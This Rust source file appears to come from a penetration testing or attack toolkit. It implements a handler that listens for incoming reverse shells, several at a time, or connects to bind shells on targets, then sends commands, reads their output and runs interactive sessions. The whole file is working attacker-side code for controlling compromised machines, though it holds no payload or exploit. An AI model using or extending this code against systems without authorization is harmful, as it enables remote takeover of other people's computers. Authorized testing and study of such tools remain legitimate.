use anyhow::{Context, Result, anyhow};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use std::sync::Arc;
use tokio::sync::Mutex;

/// Shell type for remote connections
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ShellType {
    /// Reverse shell - target connects back to us
    Reverse,
    /// Bind shell - we connect to target
    Bind,
}

/// Remote shell handler for managing reverse and bind shells
pub struct RemoteShellHandler {
    shell_type: ShellType,
    host: String,
    port: u16,
    connection: Arc<Mutex<Option<TcpStream>>>,
}

impl RemoteShellHandler {
    /// Create a new remote shell handler
    pub fn new(shell_type: ShellType, host: String, port: u16) -> Self {
        Self {
            shell_type,
            host,
            port,
            connection: Arc::new(Mutex::new(None)),
        }
    }

    /// Start the handler (listen for reverse shell or connect for bind shell)
    pub async fn start(&self) -> Result<()> {
        match self.shell_type {
            ShellType::Reverse => self.listen_reverse().await,
            ShellType::Bind => self.connect_bind().await,
        }
    }

    /// Listen for incoming reverse shell connection
    async fn listen_reverse(&self) -> Result<()> {
        let addr = format!("{}:{}", self.host, self.port);
        let listener = TcpListener::bind(&addr)
            .await
            .context(format!("Failed to bind to {}", addr))?;

        println!("[*] Listening for reverse shell on {}", addr);

        let (stream, peer_addr) = listener.accept().await
            .context("Failed to accept connection")?;

        println!("[+] Received connection from {}", peer_addr);

        let mut conn = self.connection.lock().await;
        *conn = Some(stream);

        Ok(())
    }

    /// Connect to bind shell on target
    async fn connect_bind(&self) -> Result<()> {
        let addr = format!("{}:{}", self.host, self.port);

        println!("[*] Connecting to bind shell at {}", addr);

        let stream = TcpStream::connect(&addr)
            .await
            .context(format!("Failed to connect to {}", addr))?;

        println!("[+] Connected to bind shell");

        let mut conn = self.connection.lock().await;
        *conn = Some(stream);

        Ok(())
    }

    /// Send a command to the remote shell
    pub async fn send_command(&self, command: &str) -> Result<()> {
        let mut conn = self.connection.lock().await;

        if let Some(stream) = conn.as_mut() {
            stream.write_all(command.as_bytes()).await
                .context("Failed to send command")?;
            stream.write_all(b"\n").await
                .context("Failed to send newline")?;
            stream.flush().await
                .context("Failed to flush stream")?;
            Ok(())
        } else {
            Err(anyhow!("No active connection"))
        }
    }

    /// Read output from the remote shell (non-blocking read with timeout)
    pub async fn read_output(&self, timeout_ms: u64) -> Result<String> {
        let mut conn = self.connection.lock().await;

        if let Some(stream) = conn.as_mut() {
            let mut output = String::new();
            let mut reader = BufReader::new(stream);

            match tokio::time::timeout(
                std::time::Duration::from_millis(timeout_ms),
                reader.read_line(&mut output)
            ).await {
                Ok(Ok(_)) => Ok(output),
                Ok(Err(e)) => Err(anyhow!("Failed to read output: {}", e)),
                Err(_) => Ok(String::new()), // Timeout, return empty string
            }
        } else {
            Err(anyhow!("No active connection"))
        }
    }

    /// Execute a command and wait for output
    pub async fn execute(&self, command: &str, timeout_ms: u64) -> Result<String> {
        self.send_command(command).await?;

        // Give the command time to execute
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;

        let mut output = String::new();
        let start = std::time::Instant::now();

        while start.elapsed().as_millis() < timeout_ms as u128 {
            match self.read_output(100).await {
                Ok(line) => {
                    if line.is_empty() {
                        break;
                    }
                    output.push_str(&line);
                }
                Err(_) => break,
            }
        }

        Ok(output)
    }

    /// Start interactive shell session (channels for input/output)
    pub async fn interactive(&self) -> Result<(mpsc::Sender<String>, mpsc::Receiver<String>)> {
        let conn_guard = self.connection.lock().await;

        if conn_guard.is_none() {
            return Err(anyhow!("No active connection"));
        }
        drop(conn_guard);

        let (input_tx, mut input_rx) = mpsc::channel::<String>(100);
        let (output_tx, output_rx) = mpsc::channel::<String>(100);

        let connection = self.connection.clone();

        // Spawn task to handle input
        tokio::spawn(async move {
            while let Some(cmd) = input_rx.recv().await {
                let mut conn = connection.lock().await;
                if let Some(stream) = conn.as_mut() {
                    if stream.write_all(cmd.as_bytes()).await.is_err() {
                        break;
                    }
                    if stream.write_all(b"\n").await.is_err() {
                        break;
                    }
                    let _ = stream.flush().await;
                }
            }
        });

        let connection = self.connection.clone();

        // Spawn task to handle output
        tokio::spawn(async move {
            loop {
                let mut conn = connection.lock().await;
                if let Some(stream) = conn.as_mut() {
                    let mut reader = BufReader::new(stream);
                    let mut line = String::new();

                    match tokio::time::timeout(
                        std::time::Duration::from_millis(100),
                        reader.read_line(&mut line)
                    ).await {
                        Ok(Ok(n)) if n > 0 => {
                            if output_tx.send(line).await.is_err() {
                                break;
                            }
                        }
                        Ok(Ok(_)) => break, // EOF
                        Ok(Err(_)) => break, // Error
                        Err(_) => continue, // Timeout
                    }
                } else {
                    break;
                }
                drop(conn);
                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
            }
        });

        Ok((input_tx, output_rx))
    }

    /// Check if connection is active
    pub async fn is_connected(&self) -> bool {
        let conn = self.connection.lock().await;
        conn.is_some()
    }

    /// Close the connection
    pub async fn close(&self) -> Result<()> {
        let mut conn = self.connection.lock().await;
        if let Some(mut stream) = conn.take() {
            stream.shutdown().await
                .context("Failed to shutdown connection")?;
        }
        Ok(())
    }

    /// Get connection information
    pub async fn get_connection_info(&self) -> Option<ConnectionInfo> {
        let conn = self.connection.lock().await;
        if let Some(stream) = conn.as_ref() {
            if let (Ok(local), Ok(peer)) = (stream.local_addr(), stream.peer_addr()) {
                return Some(ConnectionInfo {
                    shell_type: self.shell_type,
                    local_addr: local.to_string(),
                    peer_addr: peer.to_string(),
                });
            }
        }
        None
    }
}

/// Connection information
#[derive(Debug, Clone)]
pub struct ConnectionInfo {
    pub shell_type: ShellType,
    pub local_addr: String,
    pub peer_addr: String,
}

/// Reverse shell listener that can handle multiple connections
pub struct ReverseShellListener {
    host: String,
    port: u16,
}

impl ReverseShellListener {
    /// Create a new reverse shell listener
    pub fn new(host: String, port: u16) -> Self {
        Self { host, port }
    }

    /// Start listening for connections and return handler for each connection
    pub async fn listen(&self) -> Result<RemoteShellHandler> {
        let handler = RemoteShellHandler::new(
            ShellType::Reverse,
            self.host.clone(),
            self.port,
        );
        handler.start().await?;
        Ok(handler)
    }

    /// Listen and accept multiple connections
    pub async fn listen_multiple<F>(&self, mut callback: F) -> Result<()>
    where
        F: FnMut(RemoteShellHandler) -> Result<()>,
    {
        let addr = format!("{}:{}", self.host, self.port);
        let listener = TcpListener::bind(&addr)
            .await
            .context(format!("Failed to bind to {}", addr))?;

        println!("[*] Listening for reverse shells on {}", addr);

        loop {
            let (stream, peer_addr) = listener.accept().await
                .context("Failed to accept connection")?;

            println!("[+] Received connection from {}", peer_addr);

            let handler = RemoteShellHandler {
                shell_type: ShellType::Reverse,
                host: self.host.clone(),
                port: self.port,
                connection: Arc::new(Mutex::new(Some(stream))),
            };

            callback(handler)?;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_remote_shell_handler_creation() {
        let handler = RemoteShellHandler::new(
            ShellType::Reverse,
            "127.0.0.1".to_string(),
            4444,
        );
        assert!(!handler.is_connected().await);
    }

    #[tokio::test]
    async fn test_reverse_shell_listener_creation() {
        let listener = ReverseShellListener::new("127.0.0.1".to_string(), 4445);
        assert_eq!(listener.host, "127.0.0.1");
        assert_eq!(listener.port, 4445);
    }
}
